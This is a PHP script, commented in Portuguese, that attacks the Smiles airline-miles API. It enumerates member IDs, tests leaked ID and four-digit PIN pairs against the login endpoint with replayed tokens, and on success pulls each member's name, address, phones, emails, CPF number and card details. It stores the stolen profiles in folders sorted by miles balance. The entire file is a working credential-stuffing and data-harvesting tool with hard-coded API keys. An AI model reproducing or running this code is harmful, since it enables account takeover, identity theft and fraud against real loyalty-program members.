<?php
    error_reporting(0);
    /**
     *  1-) Monitoramento de IP - verificar a localization.
     *  2-) Realizar a conexão com API da Smiles.
     */
    function MonitoringIP(){
        $curl = curl_init();
        curl_setopt_array($curl,[
            CURLOPT_URL => "https://api.ipify.org?format=json",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => -1,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_CUSTOMREQUEST => "GET",
        ]);
        $result = curl_exec($curl);
        $json_decode = json_decode($result,true);
        curl_close($curl);
        return $json_decode['ip'];
        
    }
    function CreateID($loop=100){
        $x = 0;
        $ids = [];
        while($x<=$loop){
            $x = $x + 1;
            $id_one = random_int(0,9);
            $id_two = random_int(0,9);
            $id_three = random_int(0,9);
            $id_for = random_int(0,9);
            $id_five = random_int(0,9);
            $id_six = random_int(0,9);
            $id_sever = random_int(0,9);
            $id_eight = random_int(0,9);
            $id_nine = random_int(0,9);
            $save_id = "$id_one$id_two$id_three$id_for$id_five$id_six$id_sever$id_eight$id_nine";
            $ids[] = $save_id;
        }
        return $ids;
    }
    function MonitoringID($loop=true){
            $CreateID = CreateID($loop);
            foreach($CreateID as $id){
                $date = date('d/m/Y H:i:s');
                $http = [
                    'Host: api.smiles.com.br',
                    'Content-Type: application/json;charset=UTF-8',
                    'Accept: application/json',
                    "Authorization: Basic ODI3MTYwZDktMDI2MS00MTVmLTk5M2QtZTQ3ZmQwM2Y4ZWE1OmZhYmVkYzQyLWMwZmQtNGQ0NC1hZWY4LTNlN2RjMjcxOWIwOA==",
                    'Channel: APP',
                    "X-D-Token: 3:nScm+806HEdoz84qLuAhgg==:/YRrhdCe+hRqfq66Ics1ReJ3qBpcffx62Rj9vIjFVtzDh3vjTrNlkmifKmSTdOOb0YV3W7Nt8kkMJB7Dnoho74qr6oVF/nEO3Q84pPfa9G0b7ceb+lpCmNguQF2/SlnOS7QKksHm3008+ZfHOwOsHWMC3A/O1ruReXTwzoGAyOY08zkoujncLbzdRahTUyPDXLq75CJN+kioY7yEAYz7+OCYcXmUzlyQ9ruyXUoaAh8rpyuhYe7RTUWrY8kCJZEfD/33QC8NH82sl+6XOg3nUtHWWY+ss5rwLO85oQp1+s67zS0S7omXOGYLd2S5RuOJQrj8o1GkwIZZWnUyif3IFQ==:aCU3XYXwClI8NKdIe3OYILTrTQI0IAHErmV9LoF0TWg=.RcRLwkjy7M0SYFZZ",
                    'X-Api-Key: avtWnVksYg2u2CQo1zvs69DuTC3G5jQ185DA5uAc',
                    'User-Agent: Smiles/2.164.0/22180;IOS (iPhone12,1; iOS 17.0.3; Scale/2.00)',
                ];
                $curl = curl_init();
                curl_setopt_array($curl,[
                    CURLOPT_URL => "https://api.smiles.com.br/api/members/positiveConfirmation/emailDomain?id=$id",
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_TIMEOUT => 60,
                    CURLOPT_CUSTOMREQUEST => "GET",
                    CURLOPT_HTTPHEADER => $http,
                ]);
                $result = curl_exec($curl);
                curl_close($curl);
                $result =  json_decode($result, true);
                $save = [];
                foreach($result as $value){
                    if(strpos($value,"@")){
                        $save[] = "$id:".$result["domain"];
                        $date = date("d_m_Y");
                        $dir = "./key/ALL/".$date;
                        $file = "./key/ALL/".$date."/id.txt";
                        $files = "./key/ALL/".$date."/email.txt";
                        if(!is_dir($dir)){
                            mkdir($dir);
                        }
                        $SmileFile = fopen($file, "a+");
                        fwrite($SmileFile, "$id\n");
                        fclose($SmileFile);
                        $SmileFiles = fopen($files, "a+");
                        fwrite($SmileFiles, $result["domain"]."\n");
                        fclose($SmileFiles);
                        echo"\e[0;32;42m[ • ] \e[0m\e[0;42m CREATE SUCCESS ID: $id | RESULT: ".$result["domain"]." [ BRAZIL | ARGENTINA | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
                    }else{
                        echo"\e[1;31;41m[ • ] \e[0m\e[0;41m CREATE INVALID ID: $id | RESULT: ".$result["errorMessage"]." ! [ BRAZIL | ARGENTINA | $date ] "."\e[0m\e[1;31;41m[ • ] \e[0m\n";
                    }
                }
                sleep(0.5);
            }
            return $save;
    }
    function MonitoringCookies($cookie){
        /**
         * Check-in cookies
         * 1-) Salvar os dados no Array.
         * 2-) Fazer Verificacion.
         */
        $date = date('d/m/Y H:i:s');
        $cookies = file_get_contents("./json/cookies.json");
        $cookies_file = json_decode($cookies,true);
        $cookies_save_authorization = array();
        $cookies_save_token = array();
        $check = 0;
        foreach($cookies_file["Authorization"] as $key => $value){
            $cookies_save_authorization[$key] = $value;
        }
        foreach($cookies_file["Token"] as $key => $value){
            $cookies_save_token[$key] = $value;
        }
        $cookies_init = count($cookies_save_authorization);
        $cookies_save = count($cookies_save_authorization)+1;
        $check_number = 0;
        $check_saves = [];
        while ($check_number<=$cookies_save){
            $cookies = file_get_contents("./json/cookies.json");
            $cookies_file = json_decode($cookies,true);
            $checks = $cookies_file["Authorization"][$check_number]==$cookies_save_authorization[$check_number];
            if($checks==false){
                $check_saves[$check_number] = "true";
                if(count($check_saves)==$cookies_init){
                    echo"\e[0;32;42m[ • ] \e[0m\e[0;42m COOKIES SET SUCCESSFULLY : $cookies_save_authorization[$check_number] | [ START 20 SECONDS ] | [ BRAZIL | ARGENTINA | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
                    sleep(20);
                    return true;
                }
            }
            if($check_number==$cookies_save-1){
                $check_number = 0;

            }else{
                echo"\e[;1;33;43m[ • ] \e[0m\e[0;43m INVALID COOKIES : $cookies_save_authorization[$check_number] | [ BRAZIL | ARGENTINA | $date ] "."\e[0m\e[;1;33;43m[ • ] \e[0m\n";
                $check_number = $check_number + 1;
            }
            sleep(3);
        }
    }
    function ConnectionSmiles($id,$pass,$cookies_number=5){
        $date = date('d/m/Y H:i:s');
        if(is_numeric($id) AND is_numeric($pass)){
            $cookies = file_get_contents("./json/cookies.json");
            $cookies = json_decode($cookies,true);
            $cookies_random = random_int(0,$cookies_number);
            $cookies_authorization = $cookies["Authorization"][$cookies_number];
            $cookies_token = $cookies["Token"][$cookies_number];
            $http = [
                'Host: api.smiles.com.br',
                'Content-Type: application/json;charset=UTF-8',
                'Accept: application/json',
                'Channel: APP',
                "$cookies_authorization",
                "$cookies_token",
                'X-Api-Key: avtWnVksYg2u2CQo1zvs69DuTC3G5jQ185DA5uAc',
                'User-Agent: Smiles/2.167.0/22196;IOS (iPhone12,1; iOS 17.1.2; Scale/2.00)',
            ];
            $post = [
                "id" => $id,
                "password" => $pass
            ];
            $post = json_encode($post);
            $curl = curl_init();
            curl_setopt_array($curl,[
                CURLOPT_URL => "https://api.smiles.com.br/smiles/login",
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_CUSTOMREQUEST => "POST",
                CURLOPT_POSTFIELDS => $post,
                CURLOPT_HTTPHEADER => $http,
            ]);
            $result = curl_exec($curl);
            curl_close($curl);
            $result =  json_decode($result, true);
            if($result["token"]){
                echo"\e[0;32;42m[ • ] \e[0m\e[0;42m LOGIN SUCCESS : $id | $pass | [ BRAZIL | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
                return [true,$result["token"]];
            }elseif($result["errorCode"]=="206"){
                echo"\e[0;32;42m[ • ] \e[0m\e[0;42m LOGIN SUCCESS : $id | $pass | [ ARGENTINA | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
                /**
                 * ! REALIZAR VERIFICATION DE LOGIN NO SITE ARGENTINA.
                 *  1-) SAVAR O ID DO USUARIOS.
                 */
                
                $date = date("d_m_Y");
                $dir = "./key/AR/".$date;
                $file = "./key/AR/".$date."/id.txt";
                if(!is_dir($dir)){
                    mkdir($dir);
                    if(!is_file($file)){
                        $SmileFile = fopen($file, "a+");
                        fwrite($SmileFile, "$id\n");
                        fclose($SmileFile);
                    }
                }
                $checkline = fopen($file,'r');
                $checkresult = true;
                while ($line = fgets($checkline)) {
                    if($line==$id){
                        $checkresult = false;
                    }
                }
                fclose($checkline);
                if($checkresult==true){
                    $SmileFile = fopen($file, "a+");
                    fwrite($SmileFile, "$id\n");
                    fclose($SmileFile);
                }
            }elseif($result["errorCode"]=="49"){
                echo"\e[1;31;41m[ • ] \e[0m\e[0;41m INVALID LOGIN : $id | $pass | [ BRAZIL | ARGENTINA | $date ] "."\e[0m\e[1;31;41m[ • ] \e[0m\n";
                return [false,$id];
            }elseif($result["errorCode"]=="999"){
                echo"\e[1;31;41m[ • ] \e[0m\e[0;41m INVALID COOKIES : $id | $pass | [ BRAZIL | ARGENTINA | $date ] "."\e[0m\e[1;31;41m[ • ] \e[0m\n";
                $cookies_check = MonitoringCookies($cookies_number);
                if($cookies_check){
                    return [true,$id];
                }
            }else{
                echo"\e[1;31;41m[ • ] \e[0m\e[0;41m INVALID LOGIN : $id | $pass | [ BRAZIL | ARGENTINA | $date ] "."\e[0m\e[1;31;41m[ • ] \e[0m\n";
                print_r($result);
                echo "\n";
            }
    }else{
        echo"\e[1;31;41m[ • ] \e[0m\e[0;41m [ NOT NUMERIC ] | INVALID LOGIN : $id | $pass | [ BRAZIL | ARGENTINA | $date ] "."\e[0m\e[1;31;41m[ • ] \e[0m\n";
    }
    }
    function ConnectionMember($id,$pass,$token){
        $date = date('d/m/Y H:i:s');
        $http = [
            "Host: graphql-prd.smiles.com.br",
            "Accept: */*",
            "Content-Type: application/json",
            "Channel: APP",
            "User-Agent: Smiles/22180 CFNetwork/1474 Darwin/23.0.0",
            "Authorization: Bearer $token",
        ];
        $post = '{"query":"query GetMember($withMissionGame: Boolean!) {\n  member {\n    __typename\n    memberNumber\n    firstName\n    lastName\n    birthDay\n    gender\n    citizenship\n    availableMiles\n    milesToExpire\n    milesNextExpirationDate\n    category\n    status\n    currencyCode\n    memberSince\n    address {\n      __typename\n      streetName\n      number\n      complement\n      city\n      state\n      country\n      zipCode\n    }\n    contact {\n      __typename\n      phone {\n        __typename\n        internationalCode\n        areaCode\n        number\n      }\n      cellPhone {\n        __typename\n        internationalCode\n        areaCode\n        number\n      }\n      secondaryCellPhone {\n        __typename\n        internationalCode\n        areaCode\n        number\n      }\n      workPhone {\n        __typename\n        internationalCode\n        areaCode\n        number\n      }\n      email\n      secondaryEmail\n    }\n    documentList {\n      __typename\n      number\n      type\n    }\n    role\n    isClubMember\n    neverCall\n    neverEmail\n    neverFax\n    neverMail\n    allowPromoEmail\n    allowMail\n    allowSMS\n    allowCall\n    language\n    iva\n    socialIdNumber\n    socialIdProvider\n    statusCobranded\n    alertList {\n      __typename\n      code\n      message\n    }\n    membership(checkPendingPlan: true) {\n      __typename\n      signatureCode\n      membershipStatus\n      renewSRId\n      renewSRNum\n      renewSrStatus\n      renewRequestDate\n      isRenewable\n      currentPlan {\n        __typename\n        id\n        monthlyCost\n        name\n        benefitList {\n          __typename\n          id\n          description\n          name\n        }\n        expiredDate\n        type\n        annualCost\n        validity\n        automaticRenewal\n        validityEndDate\n        gracePeriodEndDate\n        installmentQuantity\n        transactionQuantity\n      }\n      clubMemberSince\n      CancellationSRId\n      CancellationSRStatus\n      cancellationSRDate\n      paymentList {\n        __typename\n        id\n        authorizationCode\n        creditCard {\n          __typename\n          bin\n          number\n          brand\n          nsu\n          token\n          gateway\n        }\n        paymentDate\n        signaturedId\n        status\n        totalValue\n        miles\n        validityPeriod\n        reference\n        paymentId\n        installmentQuantity\n        validityStartDate\n        validityEndDate\n      }\n      newPlanId\n      newPlanOperationType\n      newPlanRequestedDate\n      newPlanName\n      currentCreditCard {\n        __typename\n        bin\n        number\n        brand\n        token\n        identifier\n        gateway\n      }\n      currentBonus\n      nextBonus\n      daysRemaining\n      totalAccruedBonus\n      totalSmilesClubMilesAccrued\n      totalSmilesClubPendingAccrual\n      freeReservationMade\n      allowPromotional\n    }\n    mgm {\n      __typename\n      parameters {\n        __typename\n        bonusIndicated\n        bonusIndicator\n        bonusIndicatorAdesao\n        promoExpirationDate\n      }\n      indication {\n        __typename\n        indicationCode\n        status\n      }\n      signatureCheck {\n        __typename\n        status\n        hasIndications\n        referenceDate\n        balance {\n          __typename\n          totalIndicationsAllowed\n          milesEarned\n          IndicationsMade\n          maxIndicationsInMonth\n        }\n      }\n    }\n    voucher(voucherNumber: \"\", voucherType: \"ALL\", fieldOrder: \"id\", orderType: ASC, page: 1, quantity: 50) {\n      __typename\n      voucherMemberList {\n        __typename\n        id\n        createdDate\n        expiration\n        availableMiles\n        binRequired\n        bookingClass\n        description\n        details\n        discount\n        endFlightDate\n        numberParcels\n        partnerAlias\n        partnerCompanyName\n        productAlias\n        reusable\n        startFlightDate\n        totalUsed\n        type\n        memberNumber\n        quantity\n        status\n        voucherNumber\n        productList {\n          __typename\n          productAlias\n        }\n      }\n      metaInformation {\n        __typename\n        orderFieldList {\n          __typename\n          field\n          order\n        }\n        pagination {\n          __typename\n          page\n          quantity\n          total\n        }\n      }\n    }\n    quizList(preference: false) {\n      __typename\n      id\n      name\n      bonusFlag\n      bonusMiles\n      quizCreated\n      questionList {\n        __typename\n        sequence\n        id\n        text\n        bonusFlag\n        bonusMiles\n        onlyOneAnswerFlag\n        customAnswerFlag\n        customAnswerType\n        answerList {\n          __typename\n          id\n          text\n          checkAnswered\n          nextQuestionSequence\n        }\n      }\n    }\n    tier {\n      __typename\n      tierList {\n        __typename\n        name\n        active\n        startDate\n        endDate\n        memberName\n      }\n      userInfo {\n        __typename\n        memberNumber\n        memberSince\n        miles\n        legs\n        dateUpgradeLimit\n        tierDateInfo\n        showUpgrade\n        nextTier\n        milesUpgrade\n        legsUpgrade\n        milesMaintenance\n        legsMaintenance\n      }\n      tips {\n        __typename\n        title\n        subtitle\n        cardList {\n          __typename\n          title\n          description\n          actionTarget\n        }\n      }\n      popup {\n        __typename\n        footer\n        showSocial\n        subtitle\n        actionTarget\n        text\n        title\n        type\n        currentTier\n      }\n    }\n    benefitsInfo {\n      __typename\n      benefits {\n        __typename\n        smiles {\n          __typename\n          title\n          subtitle\n          card {\n            __typename\n            title\n            subtitle\n          }\n          list {\n            __typename\n            category\n            title\n            description\n          }\n          additional {\n            __typename\n            description\n          }\n        }\n        prata {\n          __typename\n          title\n          subtitle\n          card {\n            __typename\n            title\n            subtitle\n          }\n          list {\n            __typename\n            category\n            title\n            description\n          }\n          additional {\n            __typename\n            description\n          }\n        }\n        ouro {\n          __typename\n          title\n          subtitle\n          card {\n            __typename\n            title\n            subtitle\n          }\n          list {\n            __typename\n            category\n            title\n            description\n          }\n          additional {\n            __typename\n            description\n          }\n        }\n        diamante {\n          __typename\n          title\n          subtitle\n          card {\n            __typename\n            title\n            subtitle\n          }\n          list {\n            __typename\n            category\n            title\n            description\n          }\n          additional {\n            __typename\n            description\n          }\n        }\n      }\n      about {\n        __typename\n        miles {\n          __typename\n          title\n          description\n        }\n        legs {\n          __typename\n          title\n          description\n        }\n      }\n    }\n    game @include(if: $withMissionGame) {\n      __typename\n      status\n      offer_type\n      idGame\n      memberNumber\n      isReadGame\n      gameType\n      promotion_id\n      steps {\n        __typename\n        status\n        completionTime\n        reward\n        action {\n          __typename\n          type\n          threshold\n          description\n          link\n          linkPortal\n          svgIcon\n          action\n          modalText\n        }\n        index\n      }\n      campaign_id\n      reward {\n        __typename\n        quantity\n        type\n        isSurprise\n        typeRewardSurprise\n        quantityRewardSurprise\n        statusSurprise\n      }\n      start_date\n      end_date\n      optinDate\n      countDown\n    }\n  }\n}","variables":{"withMissionGame":true}}';
        $curl = curl_init();
        curl_setopt_array($curl,[
            CURLOPT_URL => "https://graphql-prd.smiles.com.br/member",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => $post,
            CURLOPT_HTTPHEADER => $http,
        ]);
        $result = curl_exec($curl);
        $result =  json_decode($result, true);
        curl_close($curl);
        $member_save = [];
        $address_save = [];
        $documentList_save = [];
        $creditCard_save = [];
        $contact_save = [];
        $contact_phone_save = [];
        $contact_cellPhone_save = [];
        $contact_secondaryCellPhone_save = [];
        $contact_workPhone_save = [];
        foreach($result as $key){
            // ! Salvando os dados MEMBER.
            $member_save["memberNumber"] = $key["member"]["memberNumber"];
            $member_save["firstName"] = $key["member"]["firstName"];
            $member_save["lastName"] = $key["member"]["lastName"];
            $member_save["birthDay"] = $key["member"]["birthDay"];
            $member_save["gender"] = $key["member"]["gender"];
            $member_save["citizenship"] = $key["member"]["citizenship"];
            $member_save["availableMiles"] = $key["member"]["availableMiles"];
            $member_save["milesToExpire"] = $key["member"]["milesToExpire"];
            $member_save["memberSince"] = $key["member"]["memberSince"];
            // ! Salvando os dados ADDRESS.
            $address_save["streetName"] = $key["member"]["address"]["streetName"];
            $address_save["number"] = $key["member"]["address"]["number"];
            $address_save["complement"] = $key["member"]["address"]["complement"];
            $address_save["city"] = $key["member"]["address"]["city"];
            $address_save["state"] = $key["member"]["address"]["state"];
            $address_save["country"] = $key["member"]["address"]["country"];
            $address_save["zipCode"] = $key["member"]["address"]["zipCode"];
            // ! Salvando os dados CONTACT PHONE.
            $contact_phone_save["areaCode"] = $key["member"]["contact"]["phone"]["areaCode"];
            $contact_phone_save["number"] = $key["member"]["contact"]["phone"]["number"];
            // ! Salvando os dados CONTACT CELL PHONE.
            $contact_cellPhone_save["areaCode"] = $key["member"]["contact"]["cellPhone"]["areaCode"];
            $contact_cellPhone_save["number"] = $key["member"]["contact"]["cellPhone"]["number"];
            // ! Salvando os dados CONTACT SECONDARY CELL PHONE.
            $contact_secondaryCellPhone_save["areaCode"] = $key["member"]["contact"]["secondaryCellPhone"]["areaCode"];
            $contact_secondaryCellPhone_save["number"] = $key["member"]["contact"]["secondaryCellPhone"]["number"];
            // ! Salvando os dados CONTACT SECONDARY WORK PHONE.
            $contact_workPhone_save["areaCode"] = $key["member"]["contact"]["workPhone"]["areaCode"];
            $contact_workPhone_save["number"] = $key["member"]["contact"]["workPhone"]["number"];
            // ! Salvando os dados CONTACT  E-MAILS.
            $contact_save["email"] = $key["member"]["contact"]["email"];
            $contact_save["secondaryEmail"] = $key["member"]["contact"]["secondaryEmail"];
            // ! Salvando os dados DOCUMENTO.
            $documentList_save["number"] = $key["member"]["documentList"][0]["number"];
            // ! Salvando os dados CARTÃO DE CREDITO.
            $creditCard_save["__typename"] = $key["member"]["membership"]["paymentList"][0]["creditCard"]["__typename"];
            $creditCard_save["bin"] = $key["member"]["membership"]["paymentList"][0]["creditCard"]["bin"];
            $creditCard_save["number"] = $key["member"]["membership"]["paymentList"][0]["creditCard"]["number"];
            $creditCard_save["brand"] = $key["member"]["membership"]["paymentList"][0]["creditCard"]["brand"];
            $creditCard_save["gateway"] = $key["member"]["membership"]["paymentList"][0]["creditCard"]["gateway"];
            $creditCard_save["paymentDate"] = $key["member"]["membership"]["paymentList"][0]["paymentDate"];
        }
        $save_doc = "##### ID: $id | PASSWORD: $pass | MILES: ".$member_save["availableMiles"]." #####\nFULL NAME: ".$member_save["firstName"]." ".$member_save["lastName"]." | MEMBER ID: ".$member_save["memberNumber"]."\nBIRTHDAY: ".$member_save["birthDay"]."\nGENDER: ".$member_save["gender"]."\nCITIZENSHIP: ".$member_save["citizenship"]."\nAvailable Miles: ".$member_save["availableMiles"]."\nMiles To Expire: ".$member_save["milesToExpire"]."\nMember Since: ".$member_save["memberSince"]."\n#### ADDRESS ####\n"."Street Name: ".$address_save["streetName"]."\nNumber: ".$address_save["number"]."\nComplement: ".$address_save["complement"]."\nCity: ".$address_save["city"]."\nState: ".$address_save["state"]."\nCountry: ".$address_save["country"]."\nZip Code: ".$address_save["zipCode"]."\n#### ID DOCUMENTS ####\n"."CPF: ".$documentList_save["number"]."\n#### CONTACT ####\n"."CONTACT PHONE: (".$contact_phone_save["areaCode"].") ".$contact_phone_save["number"]."\nCONTACT CELL PHONE: (".$contact_cellPhone_save["areaCode"].") ".$contact_cellPhone_save["number"]."\nCONTACT SECONDARY CELL PHONE: (".$contact_secondaryCellPhone_save["areaCode"].") ".$contact_secondaryCellPhone_save["number"]."\nCONTACT WORK PHONE: (".$contact_workPhone_save["areaCode"].") ".$contact_workPhone_save["number"]."\n### E-MAIL ####\n"."E-mail: ".$contact_save["email"]."\nSecondary E-mail".$contact_save["secondaryEmail"]."\n### CARD DETAILS ###\n"."TYPE NAME: ".$creditCard_save["__typename"]."\nBIN: ".$creditCard_save["bin"]."\nNumber: ".$creditCard_save["number"]."\nBRAND: ".$creditCard_save["brand"]."\nGateway: ".$creditCard_save["gateway"]."\nPayment Date: ".$creditCard_save["paymentDate"]."\n";
        if($member_save["availableMiles"]>=1000000){
            $dir = "./db/1M/".date('d_m_Y');
            $file = "./db/1M/".date('d_m_Y')."/".$id."-".$pass.".txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $file_save = fopen($file, "a+");
            fwrite($file_save, $save_doc);
            fclose($file_save);
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m LOGIN SUCCESS : ID: $id | PASSWORD: $pass | MILES: ".$member_save["availableMiles"]." | [ BRASIL | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
        }elseif($member_save["availableMiles"]>=750000){
            $dir = "./db/750K/".date('d_m_Y');
            $file = "./db/750K/".date('d_m_Y')."/".$id."-".$pass.".txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $file_save = fopen($file, "a+");
            fwrite($file_save, $save_doc);
            fclose($file_save);
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m LOGIN SUCCESS : ID: $id | PASSWORD: $pass | MILES: ".$member_save["availableMiles"]." | [ BRASIL | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
        }elseif($member_save["availableMiles"]>=500000){
            $dir = "./db/500K/".date('d_m_Y');
            $file = "./db/500K/".date('d_m_Y')."/".$id."-".$pass.".txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $file_save = fopen($file, "a+");
            fwrite($file_save, $save_doc);
            fclose($file_save);
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m LOGIN SUCCESS : ID: $id | PASSWORD: $pass | MILES: ".$member_save["availableMiles"]." | [ BRASIL | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
        }elseif($member_save["availableMiles"]>=250000){
            $dir = "./db/250K/".date('d_m_Y');
            $file = "./db/250K/".date('d_m_Y')."/".$id."-".$pass.".txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $file_save = fopen($file, "a+");
            fwrite($file_save, $save_doc);
            fclose($file_save);
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m LOGIN SUCCESS : ID: $id | PASSWORD: $pass | MILES: ".$member_save["availableMiles"]." | [ BRASIL | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
        }elseif($member_save["availableMiles"]>=100000){
            $dir = "./db/100K/".date('d_m_Y');
            $file = "./db/100K/".date('d_m_Y')."/".$id."-".$pass.".txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $file_save = fopen($file, "a+");
            fwrite($file_save, $save_doc);
            fclose($file_save);
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m LOGIN SUCCESS : ID: $id | PASSWORD: $pass | MILES: ".$member_save["availableMiles"]." | [ BRASIL | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
        }elseif($member_save["availableMiles"]>=0){
            $dir = "./db/10K/".date('d_m_Y');
            $file = "./db/10K/".date('d_m_Y')."/".$id."-".$pass.".txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $file_save = fopen($file, "a+");
            fwrite($file_save, $save_doc);
            fclose($file_save);
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m LOGIN SUCCESS : ID: $id | PASSWORD: $pass | MILES: ".$member_save["availableMiles"]." | [ BRASIL | $date ] "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
        }
    }
    function ApiChecking($file,$cookies){
        $date = date('d/m/Y H:i:s');
        $file = fopen("./log/$file",'r');
        while ($line = fgets($file)) {
            $explode = explode(":",$line);
            $id = trim($explode[0]);
            $pass = trim($explode[1]);
            $pass = trim($explode[1]);
            if(is_numeric($id) AND is_numeric($pass) AND strlen($pass)==4){
                $ConnectionSmiles = ConnectionSmiles($id,$pass,$cookies);
                if($ConnectionSmiles[0]){
                    ConnectionMember($id,$pass,$ConnectionSmiles[1]);
                }
            }else{
                echo"\e[1;31;41m[ • ] \e[0m\e[0;41m INVALID LOGIN : $id | $pass | [ BRAZIL | ARGENTINA | $date ] "."\e[0m\e[1;31;41m[ • ] \e[0m\n";
            }
        }
        fclose($file);
    }
    ApiChecking("db.txt",3);
    

?>
